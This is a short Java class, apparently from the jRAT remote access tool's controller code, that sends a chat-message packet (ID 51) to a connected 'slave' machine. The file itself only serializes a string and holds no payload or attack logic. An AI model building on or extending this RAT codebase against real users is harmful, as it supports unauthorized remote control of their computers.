package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet51ChatMessage extends AbstractOutgoingPacket {

	private String message;

	public Packet51ChatMessage(String message) {
		this.message = message;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(message);
	}

	@Override
	public byte getPacketId() {
		return 51;
	}

}
